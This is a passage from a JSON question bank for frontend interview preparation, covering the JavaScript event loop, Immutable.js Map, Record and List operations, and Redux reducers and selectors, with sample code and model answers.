              "code": "// Blocking (Synchronous) operation example (conceptual, as real JS usually uses async for heavy ops)\nfunction longRunningSynchronousTask() {\n  let sum = 0;\n  for (let i = 0; i < 1000000000; i++) {\n    sum += i;\n  }\n  console.log('Synchronous task finished:', sum);\n}\n\nconsole.log('Start of script');\nlongRunningSynchronousTask(); // This will block the thread\nconsole.log('End of script (after blocking task)');\n\n// Non-blocking (Asynchronous) operation example\nconsole.log('Start of async demo');\nsetTimeout(() => {\n  console.log('Async task finished after 0ms (via Event Loop)');\n}, 0);\nconsole.log('End of async demo (before async task)');\n\n/*\nExpected Output Order:\nStart of script\nSynchronous task finished: <large number>\nEnd of script (after blocking task)\nStart of async demo\nEnd of async demo (before async task)\nAsync task finished after 0ms (via Event Loop)\n\nExplanation:\nThe synchronous task blocks the main thread. The 'End of script' message will only appear after the loop completes.\nFor the async part, `setTimeout` is handed over to a Web API. `console.log('End of async demo...')` executes immediately.\nOnce the timer for `setTimeout` expires (even if 0ms, it still goes to the queue), its callback is placed in the Callback Queue.\nThe Event Loop then picks it up and pushes it to the Call Stack *only after* the main thread (Call Stack) is empty.\nThis demonstrates how asynchronous operations prevent the main thread from blocking.\n*/",
              "explanation": "This example conceptually distinguishes between blocking and non-blocking operations in JavaScript. A long-running synchronous task will halt all other operations, including UI updates, until it finishes. Asynchronous functions, facilitated by the Event Loop, allow such tasks to be offloaded, ensuring the main thread remains free to handle other critical operations like rendering the UI or processing user input.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_js_engine_v8_mcq_1",
            "question_js_engine_call_stack_open_1",
            "question_js_engine_heap_flashcard_1",
            "question_js_engine_call_stack_code_1"
          ],
          "relatedTasks": [
            "task_js_event_loop_prediction"
          ],
          "tags": [
            "JavaScript Engine",
            "V8",
            "Memory Management",
            "Call Stack",
            "Event Loop",
            "Concurrency",
            "Blocking"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "javascript_fundamentals"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "nodejs_development",
            "browser_performance_optimization",
            "understanding_async_js"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_immutable_js_map_update_mcq_1",
          "topic": "Immutable.js: Map Operations",
          "level": "easy",
          "type": "mcq",
          "question": "Given the following Immutable.js Map:\n```javascript\nimport { Map } from 'immutable';\nconst map1 = Map({ a: 1, b: 2 });\n```\nWhich of the following lines of code correctly updates the value of key `b` to `5` and returns a new Map, leaving `map1` unchanged?",
          "answer": "const map2 = map1.set('b', 5);",
          "options": [
            "map1.b = 5;",
            "map1.set('b', 5);",
            "const map2 = map1.set('b', 5);",
            "const map2 = map1.update('b', 5);"
          ],
          "analysisPoints": [
            "Tests understanding of Immutable.js's core principle of immutability.",
            "Distinguishes between mutation and creation of new immutable instances.",
            "Identifies the correct method (`set`) for updating a key-value pair in `Immutable.Map`."
          ],
          "keyConcepts": [
            "Immutable.js Map",
            "Immutability",
            "set() method",
            "Referential equality"
          ],
          "evaluationCriteria": [
            "Ability to select the correct Immutable.js API for non-mutating updates.",
            "Understanding that Immutable.js methods return new instances."
          ],
          "example": "The `set` method on an Immutable.js Map returns a *new* Map with the updated value, leaving the original Map untouched. Direct property assignment (`map1.b = 5;`) would not work for Immutable Maps, and `map1.set('b', 5);` without assignment would update but not capture the new Map. `update` method takes a function as second argument. Therefore, `const map2 = map1.set('b', 5);` is the correct way.",
          "tags": [
            "Immutable.js",
            "Map",
            "Immutability",
            "Basic"
          ],
          "prerequisites": [
            "immutable_js_collections"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_immutable_js_record_mcq_1",
          "topic": "Immutable.js: Record",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following Immutable.js Record definition and usage:\n```javascript\nimport { Record } from 'immutable';\n\nconst UserRecord = Record({\n  id: null,\n  name: 'Guest',\n  email: 'default@example.com'\n});\n\nconst user1 = new UserRecord({ id: 101, name: 'John Doe' });\nconst user2 = user1.set('email', 'john.doe@new.com');\n```\nWhat will be the output of `console.log(user1.get('email'))` and `console.log(user2.get('name'))` respectively?",
          "answer": "default@example.com, John Doe",
          "options": [
            "default@example.com, default@example.com",
            "default@example.com, John Doe",
            "john.doe@new.com, John Doe",
            "john.doe@new.com, default@example.com"
          ],
          "analysisPoints": [
            "Tests understanding of `Immutable.Record` default values.",
            "Tests understanding of `set` method's immutability behavior.",
            "Confirms that original `Record` instances remain unchanged after operations."
          ],
          "keyConcepts": [
            "Immutable.js Record",
            "Default values",
            "set() method",
            "Immutability"
          ],
          "evaluationCriteria": [
            "Ability to correctly predict the state of immutable objects after operations.",
            "Knowledge of how `Record` defaults are applied and overridden."
          ],
          "example": "When `user1` is created, `email` defaults to `default@example.com` as it's not provided in the constructor. The `set` operation on `user1` to create `user2` returns a *new* Record instance. `user1` itself remains unchanged. Thus, `user1.get('email')` will still be `default@example.com`. `user2` inherited `name: 'John Doe'` from `user1` (due to structural sharing) and its `email` was explicitly set, so `user2.get('name')` will be `John Doe`.",
          "tags": [
            "Immutable.js",
            "Record",
            "Immutability",
            "Medium"
          ],
          "prerequisites": [
            "immutable_js_collections"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_js_benefits_open_1",
          "topic": "Immutable.js: Benefits",
          "level": "medium",
          "type": "open",
          "question": "Explain the primary benefits of using immutable data structures, particularly in a frontend application context (e.g., with React/Redux). How do they contribute to more predictable state and better performance?",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Ability to articulate the core advantages of immutability.",
            "Connects immutability to state predictability (easier debugging, no unexpected side effects).",
            "Explains the performance benefits (referential equality checks, structural sharing).",
            "Relates concepts to real-world frontend challenges."
          ],
          "keyConcepts": [
            "Immutability",
            "Predictable State",
            "Debugging",
            "Performance Optimization",
            "Referential Equality",
            "Structural Sharing",
            "Redux",
            "React"
          ],
          "evaluationCriteria": [
            "Comprehensive understanding of immutability's impact.",
            "Clear explanation of technical concepts.",
            "Ability to apply knowledge to common frontend patterns."
          ],
          "example": "### Predicted Answer Structure:\n\n**Predictable State:**\n1.  **No Side Effects**: Immutable data structures cannot be changed after creation. Any operation that modifies the data returns a new copy. This eliminates unintended side effects where one part of the code mutates a shared object, affecting other parts of the application unexpectedly.\n2.  **Easier Debugging**: With immutability, state changes are explicit and traceable. You can always know that if a variable's reference has not changed, its content has not changed. This makes debugging state-related issues significantly easier as you don't have to worry about hidden mutations.\n3.  **Undo/Redo & Time Travel Debugging**: Because every state modification creates a new state object, it's trivial to keep a history of states. This enables powerful features like undo/redo functionality and time-travel debugging (as seen in Redux DevTools).\n\n**Better Performance (especially with React/Redux):**\n1.  **Optimized Re-renders (React/Memoization)**: React components often re-render when their props or state change. With immutable data, you can perform very cheap `===` (referential equality) checks to determine if a prop or state has actually changed. If `oldProp === newProp`, then the prop's value has not changed, and the component (or sub-tree) can skip re-rendering. This is the basis for `React.memo`, `PureComponent`, and `shouldComponentUpdate`.\n2.  **Structural Sharing**: Immutable.js implements structural sharing. When you 'modify' an immutable data structure, only the changed parts are re-created, and the unchanged parts are reused (shared) by reference. This saves memory and CPU cycles compared to deep cloning plain JavaScript objects on every update.\n3.  **Concurrency Benefits**: While less common in typical frontend JavaScript, immutability is fundamental for concurrent programming as it eliminates race conditions and simplifies parallel processing by removing the need for complex locking mechanisms when data is shared across threads (e.g., Web Workers).",
          "tags": [
            "Immutable.js",
            "Immutability",
            "Redux",
            "React",
            "Performance",
            "State Management",
            "Open-Ended"
          ],
          "prerequisites": [
            "immutable_js_collections",
            "redux_basics",
            "react_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_immutable_js_fromjs_code_1",
          "topic": "Immutable.js: `fromJS`",
          "level": "medium",
          "type": "code",
          "question": "Given the following JavaScript object representing application state:\n```javascript\nconst jsAppState = {\n  user: {\n    id: 1,\n    name: 'Jane Doe',\n    preferences: ['email', 'sms']\n  },\n  products: [\n    { id: 'p1', name: 'Laptop', price: 1200 },\n    { id: 'p2', name: 'Mouse', price: 25 }\n  ],\n  cart: []\n};\n```\nWrite JavaScript code using `Immutable.js` to:\n1.  Convert `jsAppState` into an immutable structure.\n2.  Update the user's name to 'Jane Smith' in the immutable state.\n3.  Add a new product `{ id: 'p3', name: 'Keyboard', price: 75 }` to the `products` list.\n4.  Verify that the original `jsAppState` remains unchanged and log the updated immutable state.",
          "answer": "```typescript\nimport { fromJS } from 'immutable';\n\nconst jsAppState = {\n  user: {\n    id: 1,\n    name: 'Jane Doe',\n    preferences: ['email', 'sms']\n  },\n  products: [\n    { id: 'p1', name: 'Laptop', price: 1200 },\n    { id: 'p2', name: 'Mouse', price: 25 }\n  ],\n  cart: []\n};\n\n// 1. Convert jsAppState into an immutable structure\nconst immutableAppState = fromJS(jsAppState);\n\n// 2. Update the user's name to 'Jane Smith' in the immutable state.\nconst updatedUserAppState = immutableAppState.setIn(['user', 'name'], 'Jane Smith');\n\n// 3. Add a new product to the products list.\nconst newProduct = fromJS({ id: 'p3', name: 'Keyboard', price: 75 });\nconst finalAppState = updatedUserAppState.update('products', products => products.push(newProduct));\n\n// 4. Verify that the original jsAppState remains unchanged and log the updated immutable state.\nconsole.log('Original JS App State:', jsAppState);\nconsole.log('Updated Immutable App State:', finalAppState.toJS());\n\n// Verification check for original state\nconsole.log('Original JS App State user name:', jsAppState.user.name); // Should be 'Jane Doe'\nconsole.log('Original JS App State products length:', jsAppState.products.length); // Should be 2\n\n// Verification check for updated immutable state\nconsole.log('Updated Immutable App State user name:', finalAppState.getIn(['user', 'name'])); // Should be 'Jane Smith'\nconsole.log('Updated Immutable App State products length:', finalAppState.get('products').size); // Should be 3\nconsole.log('New product added:', finalAppState.getIn(['products', 2]).toJS()); // Should be { id: 'p3', name: 'Keyboard', price: 75 }\n```",
          "options": [],
          "analysisPoints": [
            "Tests ability to use `fromJS` for deep conversion.",
            "Tests knowledge of `setIn` for nested immutable updates.",
            "Tests knowledge of `update` and `push` for list modifications.",
            "Reinforces the concept of immutability by requiring verification of the original object.",
            "Requires converting new JS objects to Immutable.js if pushing to an Immutable.List."
          ],
          "keyConcepts": [
            "Immutable.js",
            "fromJS",
            "setIn",
            "update",
            "push",
            "Immutability",
            "Nested updates"
          ],
          "evaluationCriteria": [
            "Correct application of Immutable.js APIs for given requirements.",
            "Demonstrates understanding of immutable update patterns.",
            "Effective use of `toJS()` for output verification."
          ],
          "example": null,
          "tags": [
            "Immutable.js",
            "Code Challenge",
            "State Management",
            "Medium"
          ],
          "prerequisites": [
            "immutable_js_collections"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_js_filter_flashcard_1",
          "topic": "Immutable.js: List Operations",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the purpose of the `filterNot` method on an `Immutable.List`?",
          "answer": "The `filterNot` method returns a new `Immutable.List` containing only those elements for which the provided predicate function returns `false`. In essence, it keeps elements that *do not* satisfy the condition.",
          "options": [],
          "analysisPoints": [
            "Tests quick recall of a specific Immutable.js list method.",
            "Distinguishes `filterNot` from `filter`."
          ],
          "keyConcepts": [
            "Immutable.js List",
            "filterNot",
            "Predicate function"
          ],
          "evaluationCriteria": [
            "Accurate definition of `filterNot`.",
            "Understanding of its functional purpose."
          ],
          "example": null,
          "tags": [
            "Immutable.js",
            "List",
            "Flashcard",
            "Easy"
          ],
          "prerequisites": [
            "immutable_js_collections"
          ],
          "complexity": 3,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        },
        {
          "id": "question_redux_immutable_benefits_open_1",
          "topic": "Redux with Immutable.js",
          "level": "medium",
          "type": "open",
          "question": "Discuss how integrating Immutable.js with Redux simplifies state management and improves application performance. Provide specific examples of how Redux principles like immutability and predictability are reinforced by Immutable.js.",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Explains the challenges of immutability in plain JS Redux.",
            "Details how Immutable.js solves these challenges (e.g., `setIn`, `update`).",
            "Connects Immutable.js features (structural sharing, referential equality) directly to Redux performance gains (e.g., `shouldComponentUpdate`).",
            "Demonstrates knowledge of Redux's core principles."
          ],
          "keyConcepts": [
            "Redux Immutability",
            "Reducers",
            "State Predictability",
            "Structural Sharing",
            "Referential Equality",
            "Redux Performance",
            "Immutable.js API"
          ],
          "evaluationCriteria": [
            "Clarity and depth of explanation.",
            "Ability to connect library features to architectural benefits.",
            "Demonstrates practical understanding of Redux and Immutable.js interaction."
          ],
          "example": "### Predicted Answer Structure:\n\nIntegrating Immutable.js with Redux simplifies state management and improves application performance primarily by enforcing and making it easy to adhere to the core Redux principle of immutability.\n\n**Simplifies State Management:**\n1.  **Guaranteed Immutability**: Redux mandates that reducers must be pure functions and never mutate the state directly. In plain JavaScript, this requires careful use of spread operators (`...`), `Object.assign()`, `Array.prototype.concat()`, etc., especially for deeply nested objects. It's easy to accidentally mutate state. Immutable.js provides methods (`set`, `update`, `merge`, `push`, `filterNot`) that inherently return new immutable collections, making accidental mutation impossible. This significantly reduces bugs related to unexpected state changes.\n2.  **Clearer State Updates**: The APIs provided by Immutable.js (like `setIn` for nested updates or `update` for functional transformations) are often more concise and readable than their plain JavaScript equivalents for complex state modifications. This leads to more understandable reducer logic.\n3.  **Predictability**: Because every state change results in a new immutable object, it becomes straightforward to trace state transformations. This predictability is vital for debugging and features like Redux DevTools' time-travel debugging.\n\n**Improves Application Performance:**\n1.  **Optimized Change Detection (Referential Equality)**: When Redux connects state to React components (via `react-redux`'s `connect` or `useSelector`), components need to know if they should re-render. With plain JavaScript objects, a deep comparison might be needed for nested data, which is computationally expensive. With Immutable.js, state slices are immutable, so a simple `===` (referential equality) check is sufficient to determine if a piece of state has changed. If the reference is the same, no re-render is needed. This is the foundation for `PureComponent` or `React.memo`'s performance gains.\n2.  **Structural Sharing**: Immutable.js data structures are highly optimized. When you make a 'change', only the path to that change and the changed data itself are copied. The vast majority of the data structure (the unchanged parts) are shared by reference between the old and new versions. This saves memory and CPU cycles compared to manually deep cloning large JavaScript objects on every state update.\n\n**Examples:**\n*   **Reducer Clarity**: Instead of `return { ...state, user: { ...state.user, name: action.payload } }`, an Immutable.js reducer uses `return state.setIn(['user', 'name'], action.payload);`. This is cleaner for nested updates.\n*   **Performance with `connect`/`useSelector`**: If a component is connected to a part of the Redux state that is an `Immutable.Map`, `react-redux` can efficiently compare the previous and next `Immutable.Map` references. If they are the same, the component's `render` method (or selector re-computation) is skipped, preventing unnecessary work.",
          "tags": [
            "Redux",
            "Immutable.js",
            "Immutability",
            "Performance",
            "State Management",
            "Open-Ended"
          ],
          "prerequisites": [
            "redux_basics",
            "immutable_js_collections"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_redux_immutable_reducer_mcq_1",
          "topic": "Redux with Immutable.js: Reducer Logic",
          "level": "medium",
          "type": "mcq",
          "question": "Given a Redux state managed by `Immutable.Map`, and an action to add a new `item` to a nested `items` `Immutable.List` within that state, which of the following reducer snippets correctly implements this logic?\n\nInitial State (conceptual): `Map({ data: Map({ items: List([]) }) })`\nAction: `{ type: 'ADD_ITEM', payload: { id: 1, name: 'New Item' } }`\n\n**Options:**\n```javascript\nimport { Map, List } from 'immutable';\n\n// Option A\ncase 'ADD_ITEM':\n  state.data.items.push(Map(action.payload));\n  return state;\n\n// Option B\ncase 'ADD_ITEM':\n  return state.updateIn(['data', 'items'], items => items.push(Map(action.payload)));\n\n// Option C\ncase 'ADD_ITEM':\n  const newItems = state.getIn(['data', 'items']);\n  newItems.push(Map(action.payload));\n  return state.setIn(['data', 'items'], newItems);\n\n// Option D\ncase 'ADD_ITEM':\n  return state.set('data', state.get('data').set('items', state.get('data').get('items').push(Map(action.payload))));\n```",
          "answer": "case 'ADD_ITEM':\n  return state.updateIn(['data', 'items'], items => items.push(Map(action.payload)));",
          "options": [
            "// Option A\ncase 'ADD_ITEM':\n  state.data.items.push(Map(action.payload));\n  return state;",
            "// Option B\ncase 'ADD_ITEM':\n  return state.updateIn(['data', 'items'], items => items.push(Map(action.payload)));",
            "// Option C\ncase 'ADD_ITEM':\n  const newItems = state.getIn(['data', 'items']);\n  newItems.push(Map(action.payload));\n  return state.setIn(['data', 'items'], newItems);",
            "// Option D\ncase 'ADD_ITEM':\n  return state.set('data', state.get('data').set('items', state.get('data').get('items').push(Map(action.payload))));"
          ],
          "analysisPoints": [
            "Tests understanding of immutability: identifying mutations vs. new instances.",
            "Tests knowledge of `updateIn` for efficient nested updates.",
            "Tests understanding of `push` method on `Immutable.List`.",
            "Emphasizes the need to convert plain JS objects to Immutable.Map before pushing to an Immutable.List."
          ],
          "keyConcepts": [
            "Immutable.js",
            "Redux Reducer",
            "Immutability",
            "updateIn",
            "push",
            "Nested State"
          ],
          "evaluationCriteria": [
            "Correctly applying immutable update patterns.",
            "Avoiding direct state mutation.",
            "Choosing the most idiomatic and efficient Immutable.js method."
          ],
          "example": "Option A directly mutates the `items` list (`state.data.items.push(...)`), which violates immutability and Redux principles. Option C also mutates `newItems` after getting a reference to the original Immutable.List's list. `push` always returns a new list, so `newItems.push(...)` would return a new list, but `newItems` itself would not be modified in place. However, `newItems` *is* still a direct reference to the list *inside* the immutable state, so mutating it would be incorrect (although `push` itself doesn't mutate, storing it back to `newItems` then setting it would be fine if `newItems` wasn't a direct reference from `getIn`). Option D is functionally correct but overly verbose compared to `updateIn`. Option B uses `updateIn`, which is the idiomatic and correct way to update a nested Immutable.js structure by applying a function to the value at the specified path and returning a new state.",
          "tags": [
            "Redux",
            "Immutable.js",
            "Reducer",
            "Immutability",
            "MCQ",
            "Medium"
          ],
          "prerequisites": [
            "redux_with_immutable_js",
            "immutable_js_collections"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_redux_immutable_update_code_1",
          "topic": "Redux with Immutable.js: `update` and `filterNot`",
          "level": "medium",
          "type": "code",
          "question": "You are managing a Redux state using `Immutable.Map`, which contains a `phones` `Immutable.List` of phone model strings. Implement a reducer that handles two actions:\n\n1.  `ADD_PHONE`: Adds a new phone model string to the `phones` list.\n2.  `REMOVE_PHONE`: Removes a specific phone model string from the `phones` list.\n\nUse `Immutable.js` methods (`update`, `push`, `filterNot`) to ensure immutability. The initial state should represent an empty `Map`.",
          "answer": "```typescript\nimport { Map, List } from 'immutable';\n\nfunction phoneReducer(state = Map(), action) {\n  switch (action.type) {\n    case 'ADD_PHONE':\n      // Ensure 'phones' key exists and is a List, then push the new phone\n      // List() is provided as a notSetValue to update, so it initializes 'phones' as an empty List if it doesn't exist\n      return state.update('phones', List(), phones => phones.push(action.phone));\n    case 'REMOVE_PHONE':\n      // Filter out the phone to be removed, returning a new List\n      return state.update('phones', List(), phones => phones.filterNot(phone => phone === action.phone));\n    default:\n      return state;\n  }\n}\n\n// --- Test Cases ---\nlet currentState = phoneReducer(undefined, { type: '@@INIT' }); // Initialize state\nconsole.log('Initial state:', currentState.toJS()); // {}\n\ncurrentState = phoneReducer(currentState, { type: 'ADD_PHONE', phone: 'iPhone X' });\nconsole.log('After ADD_PHONE (iPhone X):', currentState.toJS()); // { phones: ['iPhone X'] }\n\ncurrentState = phoneReducer(currentState, { type: 'ADD_PHONE', phone: 'Samsung S21' });\nconsole.log('After ADD_PHONE (Samsung S21):', currentState.toJS()); // { phones: ['iPhone X', 'Samsung S21'] }\n\ncurrentState = phoneReducer(currentState, { type: 'REMOVE_PHONE', phone: 'iPhone X' });\nconsole.log('After REMOVE_PHONE (iPhone X):', currentState.toJS()); // { phones: ['Samsung S21'] }\n\ncurrentState = phoneReducer(currentState, { type: 'REMOVE_PHONE', phone: 'NonExistentPhone' });\nconsole.log('After REMOVE_PHONE (NonExistentPhone):', currentState.toJS()); // { phones: ['Samsung S21'] } (should be unchanged)\n\ncurrentState = phoneReducer(currentState, { type: 'ADD_PHONE', phone: 'Google Pixel' });\nconsole.log('After ADD_PHONE (Google Pixel):', currentState.toJS()); // { phones: ['Samsung S21', 'Google Pixel'] }\n```",
          "options": [],
          "analysisPoints": [
            "Tests correct usage of `state.update(key, notSetValue, updaterFn)` pattern for initial list creation.",
            "Tests application of `push` for adding elements to an `Immutable.List`.",
            "Tests application of `filterNot` for removing elements from an `Immutable.List`.",
            "Ensures immutability by returning new state objects for every update.",
            "Covers edge cases like removing a non-existent item."
          ],
          "keyConcepts": [
            "Redux Reducer",
            "Immutable.js Map",
            "Immutable.js List",
            "update",
            "push",
            "filterNot",
            "Immutability"
          ],
          "evaluationCriteria": [
            "Correctly implements reducer logic using Immutable.js methods.",
            "Adheres to Redux immutability principles.",
            "Handles initial state gracefully.",
            "Provides clear and correct test cases."
          ],
          "example": null,
          "tags": [
            "Redux",
            "Immutable.js",
            "Reducer",
            "Code Challenge",
            "Medium"
          ],
          "prerequisites": [
            "redux_with_immutable_js"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_immutable_initial_state_flashcard_1",
          "topic": "Redux with Immutable.js: Initial State",
          "level": "easy",
          "type": "flashcard",
          "question": "When defining a Redux reducer that uses Immutable.js for state management, what is the typical initial value assigned to the `state` parameter?",
          "answer": "An empty `Immutable.Map` (e.g., `state = Map()`), or a pre-defined `Immutable.Map` representing the initial structure of the application state.",
          "options": [],
          "analysisPoints": [
            "Tests recall of standard Redux/Immutable.js reducer pattern.",
            "Highlights the default parameter feature of ES2015."
          ],
          "keyConcepts": [
            "Redux Reducer",
            "Initial State",
            "Immutable.js Map",
            "ES2015 default parameters"
          ],
          "evaluationCriteria": [
            "Accurate identification of the common initial state for Immutable.js reducers."
          ],
          "example": null,
          "tags": [
            "Redux",
            "Immutable.js",
            "Flashcard",
            "Easy"
          ],
          "prerequisites": [
            "redux_basics"
          ],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_redux_selector_purpose_mcq_1",
          "topic": "Redux Selectors",
          "level": "easy",
          "type": "mcq",
          "question": "What is the primary purpose of a Redux selector?",
          "answer": "To extract and potentially transform specific pieces of data from the Redux store state.",
          "options": [
            "To define the initial state of the Redux store.",
            "To dispatch actions to the Redux store.",
            "To perform asynchronous side effects.",
            "To extract and potentially transform specific pieces of data from the Redux store state."
          ],
          "analysisPoints": [
            "Tests fundamental understanding of Redux selector's role.",
            "Distinguishes selectors from reducers, actions, and middleware."
          ],
          "keyConcepts": [
            "Redux Selector",
            "State Access",
            "Data Transformation",
            "Redux Architecture"
          ],
          "evaluationCriteria": [
            "Correctly identifies the function of a selector."
          ],
          "example": "Selectors are pure functions designed to read data from the Redux state. They encapsulate the logic for accessing the state structure and can also derive computed data (e.g., filtering a list) without modifying the original state. This keeps components clean and improves reusability.",
          "tags": [
            "Redux",
            "Selectors",
            "Basic",
            "MCQ"
          ],
          "prerequisites": [
            "redux_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_redux_selector_benefits_open_1",
          "topic": "Redux Selectors",
          "level": "medium",
          "type": "open",
          "question": "Beyond simply extracting data, discuss at least three significant benefits of using selectors in a Redux application, especially when combined with a library like Reselect or when dealing with Immutable.js state.",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Explains reusability and encapsulation.",
            "Discusses decoupling of components from state shape.",
            "Highlights performance benefits through memoization (Reselect) and referential equality (Immutable.js).",
            "Mentions derived data capabilities."
          ],
          "keyConcepts": [
            "Redux Selectors",
            "Reusability",
            "Decoupling",
            "Memoization",
            "Reselect",
            "Performance Optimization",
            "Derived Data",
            "Immutable.js"
          ],
          "evaluationCriteria": [
            "Comprehensive understanding of selector advantages.",
            "Ability to explain how selectors integrate with other tools for benefits.",
            "Clarity and structure of the explanation."
          ],
          "example": "### Predicted Answer Structure:\n\nUsing selectors in a Redux application provides several significant benefits, especially when combined with memoization libraries like Reselect or when dealing with Immutable.js state:\n\n1.  **Encapsulation and Reusability**: Selectors centralize the logic for retrieving and transforming data from the Redux state. Instead of scattering state access logic across multiple components, it's defined once in a selector. This promotes the DRY (Don't Repeat Yourself) principle, making the codebase more maintainable and easier to reason about. For example, if multiple components need a filtered list of active users, a single `getActiveUsersSelector` can be created and reused.\n\n2.  **Decoupling Components from State Structure**: Selectors act as an abstraction layer between components and the raw Redux state shape. If the structure of your Redux state changes (e.g., `state.todos.list` becomes `state.data.todos`), you only need to update the relevant selectors. Components consuming these selectors remain unaffected, as they only depend on the selector's output, not the underlying state path. This significantly reduces refactoring effort and improves the robustness of the application.\n\n3.  **Performance Optimization through Memoization**: This is arguably one of the most powerful benefits, often achieved with libraries like Reselect. Memoized selectors cache their last computed result. They only re-compute if their input arguments (which are themselves outputs of other selectors, often called 'input selectors') have changed. This is particularly effective with Immutable.js, as `Immutable.Map`s and `Immutable.List`s use referential equality. If a part of the state tree hasn't changed, its Immutable.js reference remains the same, allowing memoized selectors to return the cached result immediately, preventing unnecessary re-calculations and subsequent re-renders of connected React components. For example, a selector calculating `getCompletedTasks` won't re-run if only a user's profile information changes, as long as the `tasks` list reference remains the same.\n\n4.  **Derived Data**: Selectors are ideal for computing derived data from the state. This means you can store raw, minimal data in your Redux state and use selectors to derive more complex or filtered views of that data. For instance, rather than storing both a list of `products` and a `totalPrice` in the state, you can store just `products` and use a selector to calculate `totalPrice` dynamically.",
          "tags": [
            "Redux",
            "Selectors",
            "Reselect",
            "Performance",
            "State Management",
            "Open-Ended"
          ],
          "prerequisites": [
            "redux_selectors",
            "immutable_js_collections"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_redux_selector_memoization_flashcard_1",
          "topic": "Redux Selectors",
          "level": "easy",
          "type": "flashcard",
          "question": "What is 'memoization' in the context of Redux selectors (e.g., with Reselect), and why is it important?",
          "answer": "Memoization is an optimization technique where the result of a function call is cached, and if the same inputs occur again, the cached result is returned instead of re-executing the function. In Redux selectors, it's important because it prevents unnecessary re-computation of derived data and subsequent re-renders of components, thus improving application performance.",
          "options": [],
          "analysisPoints": [
            "Tests recall of memoization definition.",
            "Connects memoization to performance in Redux context."
          ],
          "keyConcepts": [
            "Memoization",
            "Redux Selector",
            "Reselect",
            "Performance Optimization",
            "Caching"
          ],
          "evaluationCriteria": [
            "Accurate definition and justification of memoization's importance."
          ],
          "example": null,
          "tags": [
            "Redux",
            "Selectors",
            "Performance",
            "Flashcard",
            "Easy"
          ],
          "prerequisites": [
            "redux_selectors"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_selector_derived_code_1",
          "topic": "Redux Selectors",
          "level": "medium",
          "type": "code",
          "question": "Given an Immutable.js state structure for a task management application:\n```javascript\nimport { Map, List } from 'immutable';\n\nconst appState = Map({\n  tasks: List([\n    Map({ id: 1, description: 'Buy groceries', completed: false }),\n    Map({ id: 2, description: 'Walk the dog', completed: true }),\n    Map({ id: 3, description: 'Finish report', completed: false })\n  ]),\n  user: Map({ username: 'Alice', role: 'admin' })\n});\n```\nWrite two Redux selectors using `Immutable.js` methods:\n1.  `getTotalTasksCount`: A basic selector that returns the total number of tasks.\n2.  `getUncompletedTasksDescriptions`: A derived selector that returns an `Immutable.List` of descriptions of tasks that are *not* yet completed.",
          "answer": "```typescript\nimport { Map, List } from 'immutable';\nimport { createSelector } from 'reselect'; // Often used with selectors for memoization\n\nconst appState = Map({\n  tasks: List([\n    Map({ id: 1, description: 'Buy groceries', completed: false }),\n    Map({ id: 2, description: 'Walk the dog', completed: true }),\n    Map({ id: 3, description: 'Finish report', completed: false })\n  ]),\n  user: Map({ username: 'Alice', role: 'admin' })\n});\n\n// 1. Basic selector: getTotalTasksCount\nconst getTotalTasksCount = state => state.get('tasks').size;\n\n// 2. Derived selector: getUncompletedTasksDescriptions\n// Input selector for tasks list\nconst getTasksList = state => state.get('tasks');\n\nconst getUncompletedTasksDescriptions = createSelector(\n  [getTasksList], // Input selectors for data needed\n  (tasks) => {\n    // Filter for uncompleted tasks, then map to their descriptions\n    return tasks\n      .filter(task => !task.get('completed'))\n      .map(task => task.get('description'));\n  }\n);\n\n// --- Test Cases ---\nconsole.log('Total tasks count:', getTotalTasksCount(appState)); // Expected: 3\nconsole.log('Uncompleted tasks descriptions:', getUncompletedTasksDescriptions(appState).toJS());\n// Expected: ['Buy groceries', 'Finish report']\n\n// Test with an updated state (ensure immutability is handled)\nconst newState = appState.setIn(['tasks', 0, 'completed'], true);\nconsole.log('Total tasks count (after update):', getTotalTasksCount(newState)); // Expected: 3\nconsole.log('Uncompleted tasks descriptions (after update):', getUncompletedTasksDescriptions(newState).toJS());\n// Expected: ['Finish report'] (assuming 'Buy groceries' is now completed)\n```",
          "options": [],
          "analysisPoints": [
            "Tests the ability to write basic selectors using `get` and `size`.",
            "Tests the ability to write derived selectors combining `filter` and `map` on `Immutable.List`.",
            "Demonstrates understanding of how to access nested properties in Immutable.js.",
            "Implicitly tests understanding of `createSelector` for memoization (even if not strictly required, it's good practice)."
          ],
          "keyConcepts": [
            "Redux Selector",
            "Immutable.js Map",
            "Immutable.js List",
            "get",
            "size",
            "filter",
            "map",
            "Derived Data",
            "createSelector (Reselect)"
          ],
          "evaluationCriteria": [
            "Correct implementation of both basic and derived selectors.",
            "Proper use of Immutable.js methods for state access and transformation.",
            "Adherence to functional programming principles for selectors."
          ],
          "example": null,
          "tags": [
            "Redux",
            "Selectors",
            "Code Challenge",
            "Medium",
            "Immutable.js"
          ],
          "prerequisites": [
            "redux_selectors",
            "immutable_js_collections"
          ],
          "complexity": 6,
